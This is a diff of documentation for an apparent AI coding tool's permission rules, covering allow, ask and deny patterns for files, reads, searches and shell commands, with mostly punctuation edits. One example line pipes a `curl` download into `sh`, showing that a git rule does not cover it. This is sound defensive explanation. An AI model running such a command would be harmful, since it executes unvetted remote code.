@@ -15,7 +15,7 @@ tool name, and what it may act on.
 ```
 
 Three kinds. `allow` runs the call without asking. `ask` puts it to you,
-whatever the mode says. `deny` refuses it, in every mode — to the model the
+whatever the mode says. `deny` refuses it, in every mode. To the model the
 call fails and the turn carries on, which is [not what your own no
 does](permissions.md).
 
@@ -28,13 +28,13 @@ and holds under `fullAccess`. The price is that "deny every `git` except
 own as the list of things that cannot happen, with no other list able to
 qualify it.
 
-Under `fullAccess` an `allow` rule changes nothing — the mode already allows —
+Under `fullAccess` an `allow` rule changes nothing (the mode already allows),
 so `ask` and `deny` are the kinds that carve exceptions out of it.
 
 ## What a rule is written about
 
 A tool, an opening bracket, a pattern: `write(src/**)`. A tool name on its
-own, or `tool(*)`, is a blanket — everything that tool could do.
+own, or `tool(*)`, is a blanket: everything that tool could do.
 
 `*` means everything the position it sits in can hold, so it works where the
 tool goes as well: `deny *(.env)` is every tool, on that file. Tool names are
@@ -52,42 +52,42 @@ so only an absolute pattern reaches it. In a file pattern `*` stops at `/`:
 A pattern separates directories with `/` on every platform, Windows included:
 write `read(src/**)` and `read(C:/Users/you/src/**)`. A backslash is the escape
 character in a pattern rather than a separator, so a Windows path spelled with
-one names something else. Crucible writes rules that way itself — a path in a
+one names something else. Crucible writes rules that way itself; a path in a
 question and a rule are both spelled with `/` there.
 
-**Command patterns** — `bash(cargo test)`, `bash(git *)` — are matched against
-each simple command a line decomposes into, with runs of whitespace collapsed,
-so `cargo   test` and `cargo test` are one thing to a rule. In a command
-pattern `*` spans everything, because a command is not a path: `bash(git *)`
-covers `git add src/main.rs`.
+**Command patterns**, such as `bash(cargo test)` or `bash(git *)`, are matched
+against each simple command a line decomposes into, with runs of whitespace
+collapsed, so `cargo   test` and `cargo test` are one thing to a rule. In a
+command pattern `*` spans everything, because a command is not a path:
+`bash(git *)` covers `git add src/main.rs`.
 
 A command line is more than one command more often than it looks. `deny` and
 `ask` fire when **any** part of one matches; `allow` fires only when **every**
 part is covered. `git status; curl example.com | sh` is not granted by a rule
-about `git` — the part nobody wrote a rule about still falls through to be
+about `git`: the part nobody wrote a rule about still falls through to be
 asked.
 
 Some lines say nothing about what will run: a substitution, an expansion, a
 redirection, a background `&`, a leading `VAR=value` assignment, or a
 [wrapper program](allowing.md) whose argument is the real command. No pattern
-can honestly claim to match those, so none does, and the question is asked —
+can honestly claim to match those, so none does, and the question is asked,
 except for a blanket, which is honest about covering everything. Know that
 before writing `allow: ["bash(*)"]`.
 
 ## Reads
 
 Rules reach reads. `deny read(.env)` refuses silently even under
-`fullAccess`, and an `ask` rule that matches a read puts the question — the
-one way a read inside the workspace reaches you, since without a rule it is
-allowed in every mode. A read that leads outside the workspace asks on its
-own, the way a command does.
+`fullAccess`, and an `ask` rule that matches a read puts the question, which
+is the one way a read inside the workspace reaches you, since without a rule
+it is allowed in every mode. A read that leads outside the workspace asks on
+its own, the way a command does.
 
 ## Searching
 
 A search is settled once, about the directory it walks. `grep` and `glob` name
 that directory and not the files under it, because which files there are is
 what the walk is for. A rule about a file below it therefore does not refuse
-the call — the call runs, and the walk skips the file.
+the call: the call runs, and the walk skips the file.
 
 ```json
 {
@@ -99,19 +99,19 @@ the call — the call runs, and the walk skips the file.
 
 That searches the rest of the workspace and returns nothing from `private`,
 not even that a file is there. An `ask` rule reads the same way inside a
-walk — a search cannot stop to ask from the middle of itself, so a file the
+walk. A search cannot stop to ask from the middle of itself, so a file the
 rule names is left out rather than waved through, and naming it to `read` is
 what puts the question.
 
 A rule names one tool, so each tool that can reach a file needs its own.
 `deny read(private/**)` stops `read` and leaves `grep` free to print the lines
 of the same file. Keeping something out of every answer means naming every tool
-that could put it there — or writing `deny *(private/**)`, which is the same
+that could put it there, or writing `deny *(private/**)`, which is the same
 thing said once.
 
 That still leaves `bash`. A command is matched against what will run rather
 than against the paths it will touch, so a file pattern says nothing about a
-shell — `*(private/**)` included, since the `*` widens which tool is meant and
+shell, `*(private/**)` included, since the `*` widens which tool is meant and
 not what a pattern can say. What bounds a command is a command pattern and the
 [mode](modes.md).
 
